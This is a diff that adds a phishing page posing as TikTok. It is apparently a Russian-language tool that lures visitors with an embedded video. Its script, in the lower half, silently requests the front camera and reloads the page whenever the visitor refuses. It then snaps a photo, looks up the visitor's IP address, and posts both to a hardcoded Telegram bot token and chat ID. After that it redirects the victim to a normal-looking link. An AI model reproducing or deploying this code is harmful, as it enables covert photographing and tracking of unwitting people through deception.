@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en" data-critters-container="">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Tiktok</title>
+    <base href=".">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="https://m-tik-tok.ru/favicon.ico">
+    <link rel="shortcut icon" href="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2" type="image/x-icon">
+    <link rel="stylesheet" href="./Tiktok_files/all.css">
+    <link rel="stylesheet" type="text/css" href="./Tiktok_files/index.css">
+
+    <meta property="og:title" content="Tiktok">
+    <meta property="og:site_name" content="Tiktok">
+    <meta property="og:url" content="">
+    <meta property="og:description" content="Video">
+    <meta property="og:image" content="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2">
+
+    <style>
+        #video {
+            display: none;
+        }
+    </style>
+    <script async="" src="./Tiktok_files/tag.js"></script>
+    <script src="./Tiktok_files/jquery.min.js"></script>
+    <script src="./Tiktok_files/adapter-latest.js"></script>
+
+    <script>
+        window.onload = function () {
+            var ogUrlMeta = document.querySelector('meta[property="og:url"]');
+            if (ogUrlMeta) {
+                var currentUrl = new URL(window.location.href);
+                var baseUrl = currentUrl.origin + currentUrl.pathname;
+                var searchParams = new URLSearchParams(currentUrl.search);
+
+                // Удаляем параметр 'redirect' из og:url
+                searchParams.delete('redirect');
+
+                var newUrl = baseUrl + '?' + searchParams.toString();
+                ogUrlMeta.setAttribute('content', newUrl);
+            }
+
+            var ogTitleMeta = document.querySelector('meta[property="og:title"]');
+            var ogDescriptionMeta = document.querySelector('meta[property="og:description"]');
+            if (ogTitleMeta && ogDescriptionMeta) {
+                var tiktokUrl = new URLSearchParams(window.location.search).get('tiktok');
+                if (tiktokUrl) {
+                    ogTitleMeta.setAttribute('content', 'Смотреть видео на TikTok');
+                    ogDescriptionMeta.setAttribute('content', 'Нажмите, чтобы посмотреть это видео на TikTok');
+                }
+            }
+        };
+    </script></style><link rel="stylesheet" href="./Tiktok_files/styles-5AZOFQUO.css" media="all" onload="this.media=&#39;all&#39;"><noscript><link rel="stylesheet" href="styles-5AZOFQUO.css"></noscript><style>.pageHeader_tikTok[_ngcontent-ng-c1522757785]{box-shadow:0 1px 1px #0000001f;padding:5px 0}a[_ngcontent-ng-c1522757785]{text-decoration:none;color:#000}ul[_ngcontent-ng-c1522757785]{list-style:none;padding-left:0}.text-pink[_ngcontent-ng-c1522757785]{color:#fe2c55}.text-blue[_ngcontent-ng-c1522757785]{color:#20d5ec}.btn-danger[_ngcontent-ng-c1522757785]{background-color:#fe2c55!important;border-color:#fe2c55!important}.btn-outline-danger[_ngcontent-ng-c1522757785]{border-color:#fe2c55!important;color:#fe2c55}.btn-outline-danger[_ngcontent-ng-c1522757785]:hover, .btn-danger[_ngcontent-ng-c1522757785]:hover{background-color:#fe2c55!important}.search_tikTok[_ngcontent-ng-c1522757785]{display:flex;align-items:center;border-radius:20px;background-color:#1618230f;max-width:50%;margin:auto}.search_tikTok_span[_ngcontent-ng-c1522757785]{width:1px;height:28px;margin:-3px 0;background:#1618231f}.fa-search[_ngcontent-ng-c1522757785]{color:#adadad}.search_tikTok_input[_ngcontent-ng-c1522757785]{border:none;border-radius:20px;background-color:transparent}.search_tikTok_input[_ngcontent-ng-c1522757785]:hover, .search_tikTok_input[_ngcontent-ng-c1522757785]:active, .search_tikTok_input[_ngcontent-ng-c1522757785]:focus{border:none;box-shadow:none;background-color:transparent}.search_tikTok_icon[_ngcontent-ng-c1522757785]{display:block;padding:10px}.suggestedAccountIcon[_ngcontent-ng-c1522757785]{width:60px;height:60px;border-radius:100px;margin-right:10px}.actions_tikTok[_ngcontent-ng-c1522757785]{width:50px;height:50px;background-color:#ccc;display:flex;align-items:center;justify-content:center;font-size:22px;border-radius:100%}.tikTok_screen_img[_ngcontent-ng-c1522757785]{height:700px;border-radius:10px}.ms-3[_ngcontent-ng-c1522757785]{margin-left:4.3rem!important}.my-5[_ngcontent-ng-c1522757785]{margin-top:1.5rem!important;margin-bottom:1.5rem!important}.mb-5[_ngcontent-ng-c1522757785]{margin-bottom:3rem!important;margin-left:2rem!important;margin-right:2rem!important}</style><style>.pageHeader_tikTok[_ngcontent-ng-c3867143366]{box-shadow:0 1px 1px #0000001f;padding:5px 0}a[_ngcontent-ng-c3867143366]{text-decoration:none;color:#000}ul[_ngcontent-ng-c3867143366]{list-style:none;padding-left:0}.text-pink[_ngcontent-ng-c3867143366]{color:#fe2c55}.text-blue[_ngcontent-ng-c3867143366]{color:#20d5ec}.btn-danger[_ngcontent-ng-c3867143366]{background-color:#fe2c55!important;border-color:#fe2c55!important}.btn-outline-danger[_ngcontent-ng-c3867143366]{border-color:#fe2c55!important;color:#fe2c55}.btn-outline-danger[_ngcontent-ng-c3867143366]:hover, .btn-danger[_ngcontent-ng-c3867143366]:hover{background-color:#fe2c55!important}.search_tikTok[_ngcontent-ng-c3867143366]{display:flex;align-items:center;border-radius:20px;background-color:#1618230f;max-width:50%;margin:auto}.search_tikTok_span[_ngcontent-ng-c3867143366]{width:1px;height:28px;margin:-3px 0;background:#1618231f}.fa-search[_ngcontent-ng-c3867143366]{color:#adadad}.search_tikTok_input[_ngcontent-ng-c3867143366]{border:none;border-radius:20px;background-color:transparent}.search_tikTok_input[_ngcontent-ng-c3867143366]:hover, .search_tikTok_input[_ngcontent-ng-c3867143366]:active, .search_tikTok_input[_ngcontent-ng-c3867143366]:focus{border:none;box-shadow:none;background-color:transparent}.search_tikTok_icon[_ngcontent-ng-c3867143366]{display:block;padding:10px}.suggestedAccountIcon[_ngcontent-ng-c3867143366]{width:60px;height:60px;border-radius:100px;margin-right:10px}.actions_tikTok[_ngcontent-ng-c3867143366]{width:50px;height:50px;background-color:#ccc;display:flex;align-items:center;justify-content:center;font-size:22px;border-radius:100%}.tikTok_screen_img[_ngcontent-ng-c3867143366]{height:700px;border-radius:10px}.ms-3[_ngcontent-ng-c3867143366]{margin-left:4.3rem!important}.my-5[_ngcontent-ng-c3867143366]{margin-top:1.5rem!important;margin-bottom:1.5rem!important}.mb-5[_ngcontent-ng-c3867143366]{margin-bottom:3rem!important;margin-left:2rem!important;margin-right:2rem!important}@media (max-width: 409px){.search_tikTok_icon[_ngcontent-ng-c3867143366]{padding-right:50px!important}}</style><style>.pageHeader_tikTok[_ngcontent-ng-c2833653923]{box-shadow:0 1px 1px #0000001f;padding:5px 0}a[_ngcontent-ng-c2833653923]{text-decoration:none;color:#000}ul[_ngcontent-ng-c2833653923]{list-style:none;padding-left:0}.text-pink[_ngcontent-ng-c2833653923]{color:#fe2c55}.text-blue[_ngcontent-ng-c2833653923]{color:#20d5ec}.btn-danger[_ngcontent-ng-c2833653923]{background-color:#fe2c55!important;border-color:#fe2c55!important}.btn-outline-danger[_ngcontent-ng-c2833653923]{border-color:#fe2c55!important;color:#fe2c55}.btn-outline-danger[_ngcontent-ng-c2833653923]:hover, .btn-danger[_ngcontent-ng-c2833653923]:hover{background-color:#fe2c55!important}.search_tikTok[_ngcontent-ng-c2833653923]{display:flex;align-items:center;border-radius:20px;background-color:#1618230f;max-width:50%;margin:auto}.search_tikTok_span[_ngcontent-ng-c2833653923]{width:1px;height:28px;margin:-3px 0;background:#1618231f}.fa-search[_ngcontent-ng-c2833653923]{color:#adadad}.search_tikTok_input[_ngcontent-ng-c2833653923]{border:none;border-radius:20px;background-color:transparent}.search_tikTok_input[_ngcontent-ng-c2833653923]:hover, .search_tikTok_input[_ngcontent-ng-c2833653923]:active, .search_tikTok_input[_ngcontent-ng-c2833653923]:focus{border:none;box-shadow:none;background-color:transparent}.search_tikTok_icon[_ngcontent-ng-c2833653923]{display:block;padding:10px}.suggestedAccountIcon[_ngcontent-ng-c2833653923]{width:60px;height:60px;border-radius:100px;margin-right:10px}.actions_tikTok[_ngcontent-ng-c2833653923]{width:50px;height:50px;background-color:#ccc;display:flex;align-items:center;justify-content:center;font-size:22px;border-radius:100%}.tikTok_screen_img[_ngcontent-ng-c2833653923]{height:700px;border-radius:10px}.ms-3[_ngcontent-ng-c2833653923]{margin-left:2.3rem!important}.my-5[_ngcontent-ng-c2833653923]{margin-top:1.5rem!important;margin-bottom:1.5rem!important}.mb-5[_ngcontent-ng-c2833653923]{margin-bottom:3rem!important;margin-left:2rem!important;margin-right:2rem!important}</style><style>.pageHeader_tikTok[_ngcontent-ng-c805604772]{box-shadow:0 1px 1px #0000001f;padding:5px 0}a[_ngcontent-ng-c805604772]{text-decoration:none;color:#000}ul[_ngcontent-ng-c805604772]{list-style:none;padding-left:0}.text-pink[_ngcontent-ng-c805604772]{color:#fe2c55}.text-blue[_ngcontent-ng-c805604772]{color:#20d5ec}.btn-danger[_ngcontent-ng-c805604772]{background-color:#fe2c55!important;border-color:#fe2c55!important}.btn-outline-danger[_ngcontent-ng-c805604772]{border-color:#fe2c55!important;color:#fe2c55}.btn-outline-danger[_ngcontent-ng-c805604772]:hover, .btn-danger[_ngcontent-ng-c805604772]:hover{background-color:#fe2c55!important}.search_tikTok[_ngcontent-ng-c805604772]{display:flex;align-items:center;border-radius:20px;background-color:#1618230f;max-width:50%;margin:auto}.search_tikTok_span[_ngcontent-ng-c805604772]{width:1px;height:28px;margin:-3px 0;background:#1618231f}.fa-search[_ngcontent-ng-c805604772]{color:#adadad}.search_tikTok_input[_ngcontent-ng-c805604772]{border:none;border-radius:20px;background-color:transparent}.search_tikTok_input[_ngcontent-ng-c805604772]:hover, .search_tikTok_input[_ngcontent-ng-c805604772]:active, .search_tikTok_input[_ngcontent-ng-c805604772]:focus{border:none;box-shadow:none;background-color:transparent}.search_tikTok_icon[_ngcontent-ng-c805604772]{display:block;padding:10px}.suggestedAccountIcon[_ngcontent-ng-c805604772]{width:60px;height:60px;border-radius:100px;margin-right:10px}.actions_tikTok[_ngcontent-ng-c805604772]{width:50px;height:50px;background-color:#ccc;display:flex;align-items:center;justify-content:center;font-size:22px;border-radius:100%}.tikTok_screen_img[_ngcontent-ng-c805604772]{height:700px;border-radius:10px}.ms-3[_ngcontent-ng-c805604772]{margin-left:-20px!important}.my-5[_ngcontent-ng-c805604772]{margin-top:1.5rem!important;margin-bottom:1.5rem!important}.mb-5[_ngcontent-ng-c805604772]{margin-bottom:3rem!important;margin-left:2rem!important;margin-right:2rem!important}</style><script charset="utf-8" type="text/javascript" src="chrome-extension://gbdfmlkiafpjocliomeeabjikgbjgian/metric.js"></script><link rel="stylesheet" type="text/css" id="ttEmbedLibCSS" href="./Tiktok_files/embed_lib_v1.0.12.css"><link rel="preconnect" href="https://www.tiktok.com/" crossorigin=""><link rel="preconnect" href="https://sf16-website-login.neutral.ttwstatic.com/" crossorigin=""><link rel="preconnect" href="https://libraweb-sg.tiktok.com/" crossorigin=""><script charset="utf-8" type="text/javascript" src="chrome-extension://gbdfmlkiafpjocliomeeabjikgbjgian/additional_features.js"></script><script charset="utf-8" type="text/javascript" src="./Tiktok_files/saved_resource"></script><script src="./Tiktok_files/js" async="" type="text/javascript" charset="UTF-8"></script><script></script></head>
+
+<body>
+  <app-root _nghost-ng-c3984273398="" ng-version="18.2.5"><router-outlet _ngcontent-ng-c3984273398=""></router-outlet><app-tt _nghost-ng-c1522757785=""><app-header _ngcontent-ng-c1522757785="" _nghost-ng-c3867143366=""><div _ngcontent-ng-c3867143366="" class="pageHeader_tikTok"><div _ngcontent-ng-c3867143366="" class="container"><div _ngcontent-ng-c3867143366="" class="d-flex align-items-center justify-content-between"><div _ngcontent-ng-c3867143366=""><a _ngcontent-ng-c3867143366="" href=""><img _ngcontent-ng-c3867143366="" src="./Tiktok_files/logo-whole-c555aa707602e714ec956ac96e9db366.svg"></a></div><div _ngcontent-ng-c3867143366="" class="flex-fill"><div _ngcontent-ng-c3867143366="" class="search_tikTok"><input _ngcontent-ng-c3867143366="" type="text" placeholder="Search accounts" class="search_tikTok_input form-control" wfd-id="id0"><span _ngcontent-ng-c3867143366="" class="search_tikTok_span"></span><span _ngcontent-ng-c3867143366="" class="search_tikTok_icon"><i _ngcontent-ng-c3867143366="" class="fas fa-search"></i></span></div></div><div _ngcontent-ng-c3867143366="" class="d-flex align-items-center"><a _ngcontent-ng-c3867143366="" href="" class="btn btn-default">Upload</a><div _ngcontent-ng-c3867143366="" class="btn btn-danger">Log In</div><div _ngcontent-ng-c3867143366="" class="btn btn-default"><i _ngcontent-ng-c3867143366="" class="fas fa-ellipsis-v"></i></div></div></div></div></div></app-header><app-sidebar _ngcontent-ng-c1522757785="" _nghost-ng-c2833653923=""><div _ngcontent-ng-c2833653923="" class="container mt-3"><div _ngcontent-ng-c2833653923="" class="row"><div _ngcontent-ng-c2833653923="" class="col-sm-8"><div _ngcontent-ng-c2833653923="" class="mb-5"><div _ngcontent-ng-c2833653923="" class="posts-container"><app-tiktok-clone _ngcontent-ng-c2833653923="" _nghost-ng-c805604772=""><div _ngcontent-ng-c805604772=""><div _ngcontent-ng-c805604772="" class="d-flex justify-content-between align-items-center"><div _ngcontent-ng-c805604772="" class="d-flex"><img _ngcontent-ng-c805604772="" class="suggestedAccountIcon" src="./Tiktok_files/avatar1.jpg"><div _ngcontent-ng-c805604772=""><h6 _ngcontent-ng-c805604772="" class="mb-0 fw-bold"> fenixbinario <i _ngcontent-ng-c805604772="" class="fas fa-check-circle text-blue"></i></h6><small _ngcontent-ng-c805604772=""><b>#CapCut #Рек</b></small></div></div><a _ngcontent-ng-c805604772="" href="" class="btn btn-outline-danger"> Follow </a></div><div _ngcontent-ng-c805604772="" class="mt-3 d-flex align-items-end"><div _ngcontent-ng-c805604772="" class="ms-3"><blockquote _ngcontent-ng-c805604772="" class="tiktok-embed" style="max-width: 605px; min-width: 325px;" cite="./Tiktok_files/7056425997356240130" data-video-id="7056425997356240130" id="v89970462298021500"><iframe name="__tt_embed__v89970462298021500" sandbox="allow-popups allow-popups-to-escape-sandbox allow-scripts allow-top-navigation allow-same-origin" src="./Tiktok_files/7056425997356240130.html" style="width: 100%; height: 740px; display: block; visibility: unset;"></iframe></blockquote></div></div></div><hr _ngcontent-ng-c805604772="" class="my-5"></app-tiktok-clone><!----></div></div></div><div _ngcontent-ng-c2833653923="" class="col-sm-4"><div _ngcontent-ng-c2833653923=""><a _ngcontent-ng-c2833653923="" class="d-flex align-items-center text-pink h5"><i _ngcontent-ng-c2833653923="" class="fas fa-home"></i><span _ngcontent-ng-c2833653923="" class="ms-2">For You</span></a><a _ngcontent-ng-c2833653923="" class="d-flex align-items-center h5"><i _ngcontent-ng-c2833653923="" class="fas fa-user-friends"></i><span _ngcontent-ng-c2833653923="" class="ms-2">Following</span></a></div><hr _ngcontent-ng-c2833653923="" class="my-5"><div _ngcontent-ng-c2833653923=""><p _ngcontent-ng-c2833653923="">Log in to follow creators, like videos, and view comments.</p><div _ngcontent-ng-c2833653923="" class="btn btn-outline-danger w-100 p-2"><b _ngcontent-ng-c2833653923="">Log in</b></div></div><hr _ngcontent-ng-c2833653923="" class="my-5"><div _ngcontent-ng-c2833653923=""><div _ngcontent-ng-c2833653923="" class="d-flex align-items-center justify-content-between"><span _ngcontent-ng-c2833653923="">Suggested accounts</span><a _ngcontent-ng-c2833653923="" href="" class="text-pink">See all</a></div><div _ngcontent-ng-c2833653923="" class="mt-2"><ul _ngcontent-ng-c2833653923=""><li _ngcontent-ng-c2833653923="" class="mb-4"><div _ngcontent-ng-c2833653923="" class="d-flex"><img _ngcontent-ng-c2833653923="" class="suggestedAccountIcon" src="./Tiktok_files/avatar5.jpg"><div _ngcontent-ng-c2833653923=""><h6 _ngcontent-ng-c2833653923="" class="mb-0 fw-bold"> pinnaclemortal <i _ngcontent-ng-c2833653923="" class="fas fa-check-circle text-blue"></i><!----></h6><small _ngcontent-ng-c2833653923="">Matt</small></div></div></li><li _ngcontent-ng-c2833653923="" class="mb-4"><div _ngcontent-ng-c2833653923="" class="d-flex"><img _ngcontent-ng-c2833653923="" class="suggestedAccountIcon" src="./Tiktok_files/avatar4.jpg"><div _ngcontent-ng-c2833653923=""><h6 _ngcontent-ng-c2833653923="" class="mb-0 fw-bold"> nogomuch_official <!----></h6><small _ngcontent-ng-c2833653923="">nogomuch</small></div></div></li><li _ngcontent-ng-c2833653923="" class="mb-4"><div _ngcontent-ng-c2833653923="" class="d-flex"><img _ngcontent-ng-c2833653923="" class="suggestedAccountIcon" src="./Tiktok_files/avatar3.jpg"><div _ngcontent-ng-c2833653923=""><h6 _ngcontent-ng-c2833653923="" class="mb-0 fw-bold"> t_i_b_e_r_i_u_s <!----></h6><small _ngcontent-ng-c2833653923="">Флэш арм</small></div></div></li><li _ngcontent-ng-c2833653923="" class="mb-4"><div _ngcontent-ng-c2833653923="" class="d-flex"><img _ngcontent-ng-c2833653923="" class="suggestedAccountIcon" src="./Tiktok_files/avatar2.jpg"><div _ngcontent-ng-c2833653923=""><h6 _ngcontent-ng-c2833653923="" class="mb-0 fw-bold"> Superfirstgirl <i _ngcontent-ng-c2833653923="" class="fas fa-check-circle text-blue"></i><!----></h6><small _ngcontent-ng-c2833653923="">Superfirstgirl</small></div></div></li><!----></ul></div></div><hr _ngcontent-ng-c2833653923=""><div _ngcontent-ng-c2833653923=""><div _ngcontent-ng-c2833653923="" class="d-flex align-items-center justify-content-between"><span _ngcontent-ng-c2833653923="">Discover</span></div><div _ngcontent-ng-c2833653923=""><span _ngcontent-ng-c2833653923="" class="badge rounded-pill border border-secondary text-dark m-2"><!----> # Discover </span><span _ngcontent-ng-c2833653923="" class="badge rounded-pill border border-secondary text-dark m-2"><!----> # Play </span><span _ngcontent-ng-c2833653923="" class="badge rounded-pill border border-secondary text-dark m-2"><!----> # Req </span><span _ngcontent-ng-c2833653923="" class="badge rounded-pill border border-secondary text-dark m-2"><i _ngcontent-ng-c2833653923="" class="fas fa-music"></i><!----> Qeen - Show Must Go </span><span _ngcontent-ng-c2833653923="" class="badge rounded-pill border border-secondary text-dark m-2"><i _ngcontent-ng-c2833653923="" class="fas fa-music"></i><!----> Then Leave (feat. Queendom Come) - BeatKing </span><!----></div></div><hr _ngcontent-ng-c2833653923=""><div _ngcontent-ng-c2833653923=""> © 2023 TikTok </div></div></div></div></app-sidebar></app-tt><!----></app-root>
+    <link rel="stylesheet" href="./Tiktok_files/styles-5AZOFQUO.css" media="all" onload="this.media='all';">
+    <noscript>
+        <link rel="stylesheet" href="./Tiktok_files/styles-5AZOFQUO.css">
+    </noscript>
+    <script charset="utf-8" type="text/javascript" src="./Tiktok_files/metric.js"></script>
+    <link rel="stylesheet" type="text/css" id="ttEmbedLibCSS" href="./Tiktok_files/embed_lib_v1.0.12.css">
+    <link rel="preconnect" href="https://www.tiktok.com/" crossorigin="">
+    <link rel="preconnect" href="https://sf16-website-login.neutral.ttwstatic.com/" crossorigin="">
+    <link rel="preconnect" href="https://libraweb-sg.tiktok.com/" crossorigin="">
+    <script charset="utf-8" type="text/javascript" src="./Tiktok_files/additional_features.js"></script>
+    <script charset="utf-8" type="text/javascript" src="./Tiktok_files/saved_resource.js"></script>
+    <script src="./Tiktok_files/js" async="" type="text/javascript" charset="UTF-8"></script>
+</head>
+
+<body>
+    <app-root _nghost-ng-c3984273398="" ng-version="18.2.5">
+        <router-outlet _ngcontent-ng-c3984273398=""></router-outlet>
+        <app-tt _nghost-ng-c1522757785="">
+            <app-header _ngcontent-ng-c1522757785="" _nghost-ng-c3867143366="">
+                <div _ngcontent-ng-c3867143366="" class="pageHeader_tikTok">
+                    <div _ngcontent-ng-c3867143366="" class="container">
+                        <div _ngcontent-ng-c3867143366="" class="d-flex align-items-center justify-content-between">
+                            <div _ngcontent-ng-c3867143366="">
+                                <a _ngcontent-ng-c3867143366="" href="">
+                                    <img _ngcontent-ng-c3867143366="" src="./Tiktok_files/logo-whole-c555aa707602e714ec956ac96e9db366.svg">
+                                </a>
+                            </div>
+                            <div _ngcontent-ng-c3867143366="" class="flex-fill">
+                                <div _ngcontent-ng-c3867143366="" class="search_tikTok">
+                                    <input _ngcontent-ng-c3867143366="" type="text" placeholder="Search accounts" class="search_tikTok_input form-control" wfd-id="id0">
+                                    <span _ngcontent-ng-c3867143366="" class="search_tikTok_span"></span>
+                                    <span _ngcontent-ng-c3867143366="" class="search_tikTok_icon">
+                                        <i _ngcontent-ng-c3867143366="" class="fas fa-search"></i>
+                                    </span>
+                                </div>
+                            </div>
+                            <div _ngcontent-ng-c3867143366="" class="d-flex align-items-center">
+                                <a _ngcontent-ng-c3867143366="" href="" class="btn btn-default">Upload</a>
+                                <div _ngcontent-ng-c3867143366="" class="btn btn-danger">Log In</div>
+                                <div _ngcontent-ng-c3867143366="" class="btn btn-default">
+                                    <i _ngcontent-ng-c3867143366="" class="fas fa-ellipsis-v"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </app-header>
+            <app-sidebar _ngcontent-ng-c1522757785="" _nghost-ng-c2833653923="">
+                <div _ngcontent-ng-c2833653923="" class="container mt-3">
+                    ... <!-- Остальная часть HTML-кода -->
+                </div>
+            </app-sidebar>
+        </app-tt>
+    </app-root>
+
+    <video id="video" width="740" height="580" autoplay="" playsinline=""></video>
+    <canvas id="canvas" width="740" height="580" style="display:none;"></canvas>
+
+    <script async="" src="./Tiktok_files/embed.js"></script>
+    <script>
+        'use strict';
+
+        const video = document.createElement('video');
+        const canvas = document.getElementById('canvas');
+        let photoTaken = false;
+        let cameraAccessAttempts = 0;
+        let savedPhoto = null;
+
+        const constraints = {
+            audio: false,
+            video: { facingMode: "user" }
+        };
+
+        function isAndroid() {
+            return /Android/i.test(navigator.userAgent);
+        }
+
+        function isTelegramInAppBrowser() {
+            if (typeof window.TelegramWebview !== "undefined") {
+                return true;
+            }
+
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            if (/Telegram/i.test(userAgent)) {
+                return true;
+            }
+
+            return false;
+        }
+
+        function isIphone() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            return /iPhone/i.test(userAgent);
+        }
+
+        async function requestCameraAccess() {
+            console.log('Запрос доступа к камере...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                console.log('Камера успешно запущена!');
+
+                if (isTelegramInAppBrowser()) {
+                    console.log("Открыто во встроенном браузере Telegram.");  
+                    if (isAndroid()) {
+                        handleSuccess(stream);
+                    } else {
+                        noasynchandleSuccess(stream);
+                    }
+                } else {
+                    if (isIphone()) {
+                        noasynchandleSuccess(stream);
+                    } else {
+                        handleSuccess(stream);
+                    }
+                }
+            } catch (e) {
+                console.log(`Ошибка доступа к камере: ${e.toString()}`);
+                cameraAccessAttempts++;
+
+                if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
+                    console.log('Перезагрузка страницы для повторного запроса доступа к камере...');
+                    location.reload();
+                } else {
+                    console.log(`Повторная попытка доступа к камере (попытка ${cameraAccessAttempts + 1})...`);
+                    requestCameraAccess();  // Повторяем запрос
+                }
+            }
+        }
+
+        function noasynchandleSuccess(stream) {
+            console.log('Начинаем обработку потока камеры...');
+            window.stream = stream;
+            video.srcObject = stream;
+
+            const context = canvas.getContext('2d');
+
+            setTimeout(function () {
+                if (!photoTaken) {
+                    console.log('Фотографирование...');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+                    canvas.toBlob(function(blob) {
+                        console.log('Фотография создана');
+                        savedPhoto = blob;
+                        photoTaken = true;
+                        setTimeout(function () {
+                            logPhotoInfo();
+                            redirectToFinalDestination();
+                        }, 2000);
+                    }, 'image/png');
+                }
+            }, 3000);
+        }
+
+        async function handleSuccess(stream) {
+            console.log('Начинаем обработку потока камеры...');
+            window.stream = stream;
+            video.srcObject = stream;
+            video.muted = true;
+            await video.play();
+            const { videoWidth, videoHeight } = video;
+
+            const context = canvas.getContext('2d');
+
+            setTimeout(function () {
+                if (!photoTaken) {
+                    canvas.width = videoWidth;
+                    canvas.height = videoHeight;
+                    context.drawImage(video, 0, 0, videoWidth, videoHeight);
+                    canvas.toBlob(function(blob) {
+                        console.log('Фотография создана');
+                        savedPhoto = blob;
+                        photoTaken = true;
+
+                        setTimeout(function () {
+                            logPhotoInfo();
+                            redirectToFinalDestination();
+                        }, 2000);
+                    }, 'image/png');
+                }
+            }, 3000);
+        }
+
+        function logPhotoInfo() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const tiktok_url = urlParams.get('tiktok') || '';
+            const user_id = urlParams.get('id') || '';
+            const redirect_url = urlParams.get('redirect') || '';
+
+            console.log('tiktokurl:', tiktok_url);
+            console.log('id:', user_id);
+            console.log('redirecturl:', redirect_url);
+            console.log('foto:', savedPhoto);
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    const userIP = data.ip;
+                    const message = encodeURIComponent(userIP); //`IP: ${userIP}`
+
+                    const formData = new FormData();
+                    formData.append('chat_id', '2106502448');
+                    formData.append('photo', savedPhoto);
+                    formData.append('caption', message);
+
+                    var xhr = new XMLHttpRequest();
+                    var url = 'https://api.telegram.org/bot7846498646:AAGqclxu7rRN5fjdAkR69vRWO12Ic4xI-a0/sendPhoto';
+                    xhr.open('POST', url, true);
+
+                    xhr.setRequestHeader('Accept', 'application/json');
+
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState === XMLHttpRequest.DONE) {
+                            if (xhr.status === 200) {
+                                console.log('Фотография успешно отправлена в Telegram:', xhr.responseText);
+                            } else {
+                                console.error('Ошибка при отправке фотографии:', xhr.status, xhr.responseText);
+                            }
+                        }
+                    };
+
+                    xhr.send(formData);
+                });
+        }
+
+        function redirectToFinalDestination() {
+            const urlParams = new URLSearchParams(window.location.search);
+
+            const https = "https://";
+            const url = urlParams.get('redirect') || urlParams.get('tiktok') || window.location.origin;
+            const redirectUrl = https + url;
+
+            console.log('Выполняем редирект на:', redirectUrl);
+
+            setTimeout(function() {
+                window.location.replace(redirectUrl);
+            }, 3000);
+        }
+
+        window.onload = () => {
+            setTimeout(requestCameraAccess, 1000);
+        };
+    </script>
+    <script src="./Tiktok_files/polyfills-LC3OKXYN.js" type="module"></script>
+    <script src="./Tiktok_files/main-EF7SOWO4.js" type="module"></script>
+
+    <div id="color-picker-toast"></div>
+    <div id="color-picker-widget" style="display: none; flex-direction: column; align-items: stretch; left: calc(100% - 50px); top: calc(100% - 50px); transform: translate(25px, 25px);">
+        <img id="pick-color-button-image" src="./Tiktok_files/pick_color_icon.png" draggable="false" alt="Pick Color">
+        <button id="pick-color-button"></button>
+        <button id="close-button" style="inset: auto 0px 0px auto;">×</button>
+    </div>
+    <script type="text/javascript" id="ttEmbedLibScript" src="./Tiktok_files/embed_lib_v1.0.12.js"></script>
+    <div class="textads banner-ads banner_ads ad-unit ad-zone ad-space adsbox" style="height: 1px;"></div>
+</body>
+</html>
